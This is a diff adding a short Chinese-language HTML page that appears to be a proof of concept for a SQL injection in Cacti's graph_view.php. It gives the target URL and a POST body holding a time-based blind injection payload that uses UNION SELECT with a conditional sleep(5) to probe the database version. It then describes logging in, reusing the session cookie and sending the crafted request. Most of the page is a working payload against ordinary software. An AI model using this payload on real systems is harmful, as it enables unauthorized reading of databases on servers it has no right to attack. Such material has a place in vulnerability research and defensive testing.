@@ -1,0 +1,10 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入URL: </h3>
+    <code>http://example.com/cacti/graph_view.php</code>
+    <h3>POST-DATA: </h3>
+    <p>延时5秒</p>
+    <code>__csrf_magic=sid:b0349195c55bddec2f2be859e0f394539ea4569a,1458781575&host_group_data=graph_template:1 union select case when ord(substring((select version()) from 1 for 1)) between 53 and 53 then sleep(5) else 0 end</code>
+    <h3>验证过程</h3>
+    <p>需要先登录，取出cookie；构造post请求，并修改请求头中的Cookie参数</p>
+</div>
